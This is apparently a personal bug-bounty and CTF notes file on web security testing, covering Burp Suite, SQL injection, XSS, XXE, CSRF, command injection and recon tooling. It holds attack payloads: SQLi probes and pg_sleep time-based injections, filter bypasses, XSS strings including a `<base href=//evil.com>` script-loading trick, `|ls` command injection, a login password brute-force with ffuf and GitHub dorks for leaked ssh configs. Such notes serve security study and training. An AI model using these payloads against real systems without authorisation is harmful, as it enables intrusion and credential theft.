##  ► web
### Tips

- Test every input, make sure to disregard any client-side restrictions.
- Remember the source and DOM are different. Keep an eye out for the devtools.
- Be aware of double encodings, browsers automatically URL-encode certain things.
- If the same functionality is available under two different endpoints, test both.
- For example, image upload while registering and image upload while editing profile.
- The server might be Windows. Don't forget, in case of webshells, you might need different commands. 
- For a newline, somtimes you need CRLF, individual CR or LF might not work: `%0d%0a` (webhacking.kr - 38).
- Just because a request fails with one method doesn't mean it will fail with a different method. Try `PUT` instead of `GET`.
- Using HTTP method `OPTIONS` to know what methods are allowed on the endpoint.
- Sometimes, `Wappalyzer` may detect extra information in different pages (or in view-source).
- Keep noting interesting things. While jumping from one feature to the next you might forget something.

### While hunting bugs
- Burp (and filter scope)
- Website source code
- Browser devtools
- These notes
- Notes for the target

### Burp Suite
- Burp hotkeys
    - Ctrl-R:       Send to repeater
    - Ctrl-space:   Repeat request
- Plugins
    - Flow / Logger++
    - Auto Repeater / Autorize 
    - DEFCON - HUNT
    - Turbo Intruder
    - BurpBounty
    - Paraminer

### Bugs

### API hacking



### AWS
- When hosting a site as an S3 bucket, the bucket name must match the domain name

#### CRLF Injection / HTTP Response Splitting
- Send a requests such that the response reflects into the headers and inject a CRLF.

#### postMessage
- https://twitter.com/s0md3v/status/1256511604046340096
- https://twitter.com/xdavidhu/status/1262317923311509505

#### Subdomain takeovers
```
$ subfinder -d http://hackerone.com -silent | dnsprobe -silent -f domain | httprobe -prefer-https | nuclei -t nuclei-templates/subdomain-takeover/detect-all-takeovers.yaml
```

#### GitHub dorks
- `"example.com" ssh language:yaml` [source](https://twitter.com/ADITYASHENDE17/status/1262747235785138178)
- `http://chat.googleapis.com/v1/rooms` [source](https://twitter.com/uraniumhacker/status/1262193407616679936)

#### GraphQL
- `https://graphql.org/learn/`

#### SQLi

- [Portswigger - SQL injection cheatsheet](https://portswigger.net/web-security/sql-injection/cheat-sheet) (doesn't include sqlite)
- Do a simple sanity check for `'` or `"` in payload. Try bypassing client side restrictions for input in fields such as date.
- Oracle comments don't work with semicolon. `OR 1=1--` might work when `OR 1=1;--` doesn't.
- MySQL comments `--` require a space after them to work `-- `.
- Remember to encode spaces to `+` and other url unsafe characters as well.
- When using `UNION` to extract `table\_name`, make sure that it is positioned with a column that has the same datatype.
- In where clause, try to use quotes to cover table and column names.
- While `union` can be used with `select`, look for **stacked queries** to execute any SQL statement. Remember to commit.
- If any words are filtered, see if they are done recursively. If not, `selselectect` if will work.
- If whitespaces are filtered you can use alternates to spaces such as: `[tabs] %0a %00 %09 %0d /**/`
- If you are in the context of MySQL, you can use variables without explicitly defining them. For example if "admin" is being filtered, you can put "nimda" as one of the columns (say, id) and use `reverse(id)` in another column (webhacking.kr - 59).
- To just see tables created by the user in MySQL: `union select table_name,null,null from information_schema.tables where table_schema not in ('information_schema','mysql','performance_schema')`
- Syntax of LIMIT: `LIMIT offset,quantity` where offset starts from 0.
- [Portswigger - Blind SQL injection](https://portswigger.net/web-security/sql-injection/blind)
- For time-based, first figure out the max time a request can take.
- For faster blind-sqli execution, first check what characters `*i*` does the target string contain from `string.printable` and append it to a filtered list. Then from that filtered list of characters, check the real order of the target string `i*`.
- Remember to start `substring(str,pos,len)` from `1` not `0`.
- Use `LIKE BINARY` for case-senstivie blind sqli matching.
- For postgres time-based, `||pg_sleep(10)`
- For postgres time-based conditions `'; SELECT CASE WHEN (condition) THEN pg_sleep(10) ELSE pg_sleep(0) END--`
- To test for SQL injection (can be put in burp intruder): [source](https://twitter.com/pwntheweb/status/1253224265853198336)

```
/?q=1
/?q=1'
/?q=1"
/?q=[1]
/?q[]=1
/?q=1`
/?q=1\
/?q=1/*'*/
/?q=1/*!1111'*/
/?q=1'||'asd'||'
/?q=1' or '1'='1
/?q=1 or 1=1
/?q='or''='
```

SQLmap
- If SQLmap stops in between, try pressing `Enter`.
- Always use `--threads 10` with SQLmap.
- Output goes to `~/.sqlmap/output/`

#### PHP

- Sometimes `<?` does not work but `<?php` does.
- Type confusion: If an array is passed to `strcmp()`, it will give a warning but the compare result returns 0.
- Object injection: If `unserialize()` is being used, you might be able to craft an object and use trampoline functions.
- Type juggling: `0e123` evaluates to `0`.
- For checking if any functions are blacklisted:
```php
var_dump(ini_get('safe_mode'));
var_dump(explode(',',ini_get('disable_functions')));
var_dump(explode(',',ini_get('suhosin.executor.func.blacklist')));
```
- We can set a directory as base using: `open_basedir`

#### XSS

- [Portswigger - XSS cheatsheet](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet)
- [Portswigger - XSS contexts](https://portswigger.net/web-security/cross-site-scripting/contexts)
- When browsers parse tag attributes, they HTML-decode their values first. `<foo bar='z'>` is the same as `<foo bar='&#x7a;'>`
- AngularJS `ng-app` attribute is processed by AngularJS. Anything within `{{}}` will be executed.
- jQuery `attr()` used to change attributes, can act as a sink.
- Strings can be concatenated using minus `-` sign. In a js `eval` context you can use: `"-alert(1)-"`
- Chrome, Firefox, Safari encode `location.search` and `location.hash`. IE11 and Edge (pre-Chromium) don't encode sources.
- To pop XSS in `innerHTML` first load the script into `iframe srcdoc` then load that `iframe` into the `innerHTML`.
- If there is any encoded entities `&lt;` and `&gt;` see if there are any `unescape` calls you can pass them through.
- `<base href=//evil.com>` allows you to change all relative URLs. For example `<script src=/xss.js>` will use `evil.com` to retrieve `xss.js`.
- Blind XSS:
    - Read `https://brutelogic.com.br/blog/blind-xss-code/` get the code here `http://brutelogic.com.br/brutal/blind/index.txt`.
    - Use `http://xss.rocks/xss.js` for including an `alert()` js file.
    - Use `xsshunter.com` to test for blind xss.
- CSP Bypass:
    - In your devtools, look at the network tab and within the headers for the response, you'll see the CSP header.
    - You can also copy the url and put it into Google's CSP Evaluator at: `csp-evaluator.withgoogle.com`
    - If `default-src` is `self`, it can be problematic if the user can upload files.
- [XSS in postMessage](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection#xss-in-postmessage)

#### XXE

- [PayloadAllTheThings - XXE](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XXE%20Injection)
- Types covered in websec academy:
    - Classic file retrieval
    - SSRF through XXE
    - Error based

#### CSRF

- Try removing the anti-CSRF token altogether.
- Try submitting anti-CSRF token generated for one user in another user's session.
- Submitting forms through JavaScript: `document.getElementById("myForm").submit();` or `document.forms[0].submit();`

#### Command Injection

- Try `|ls`.
- For time delays use `sleep 10` or `& ping -c 10 127.0.0.1 &`
- Redirect output to a file you can read using your browser.

### Resources
#### Courses

- [Web Security Academy](https://portswigger.net/web-security)
- [Pentesterlab](https://pentesterlab.com/)
- [OWASP-wstg](https://owasp.org/www-project-web-security-testing-guide/)
- [Hacker101](https://www.hackerone.com/hacker101)

#### CTF

- [247/CTF](https://247ctf.com/)
- [websec.fr](http://websec.fr/)
- [webhacking.kr](https://webhacking.kr/)
- [CTF Challenge](https://ctfchallenge.co.uk/)
- [Hacker101 CTF](https://ctf.hacker101.com/)
- [Google XSS Game](https://xss-game.appspot.com/)
- [Natas - OverTheWire](https://overthewire.org/wargames/natas/)
- [pwnfunction XSS Game](https://xss.pwnfunction.com/)

#### Vulnerable Apps

- [Juice Shop](https://owasp.org/www-project-juice-shop/)
- [bWAPP](http://www.itsecgames.com/)
- [Vulhub](https://github.com/vulhub/vulhub)
- [DVWA](http://www.dvwa.co.uk/)

#### Bug Bounty

- [Web Hacking 101](https://leanpub.com/web-hacking-101)
- [Real World Bug Hunting](https://www.amazon.in/Real-World-Bug-Hunting-Field-Hacking-ebook/dp/B072SQZ2LG)
- [Resources for Beginner Bug Bounty Hunters](https://github.com/nahamsec/Resources-for-Beginner-Bug-Bounty-Hunters/)
- [Intigriti Article](https://kb.intigriti.com/en/articles/3471127-useful-resources-about-web-hacking-bug-bounty)

### Recon
- Recon is a continuous process, keep scanning and diffing for subdomains (using git).
- Don't forget to look into the sources, interesting things might not always be inline.
- If you have multiple files containing subdomains, merge them using: `$ cat file1.txt file2.txt | sort | uniq > out`
- If you have a subdomain, look for further subdomains for it.
- When one directory isn't accessible, try its subdirectories.

#### Wordlists
- FuzzDB
- SecLists
- PayloadAllTheThings

#### projectdiscovery.io
- subfinder
- nuclei
- dnsprobe

#### tomnomnom
- gf
- meg
- httprobe
- waybackurls
- assetfinder

#### Amass
- Look into: `https://github.com/OWASP/Amass/blob/master/doc/tutorial.md`

```
$ amass intel -whois -d DOMAIN
$ amass enum -dir OUTPUT -passive -src -d DOMAIN

# Track differences between enumerations
$ amass track

# Manipulate the Amass graph database
$ amass db

# To see sources used
$ amass enum -list
```

#### ffuf
```
# -e    Comma separated list of extensions. Extends FUZZ keyword.

$ ffuf -w ~/wordlists/common.txt -u https://example.com/FUZZ
$ ffuf -w ~/wordlists/10-million-password-list-top-100.txt -X POST -d "username=admin&password=FUZZ" -H "Content-Type: application/x-www-form-urlencoded" -u https://www.example.com/login -mc all -fc 200
$ ffuf -w ~/wordlists/common.txt -b "cookie1=value1;cookie2=value2" -H "X-Header: ASDF" -u https://example.com/dir/FUZZ
```

#### dnsrecon
```
$ dnsrecon -n 8.8.8.8 -d example.com
$ dnsrecon -d example.com -D ~/wordlists/namelist.txt -t brt
```

#### gau
```
$ echo example.com | gau
$ cat domains.txt | gau
```

#### gowitness
```
$ gowitness single --url=https://www.google.com/
$ gowitness file -s ~/domains.txt
```

#### paramspider
```
$ python3 paramspider.py --domain hackerone.com
```

#### Arjun
```
$ python3 arjun.py -u http://example.domain.com/endpoint --get
```

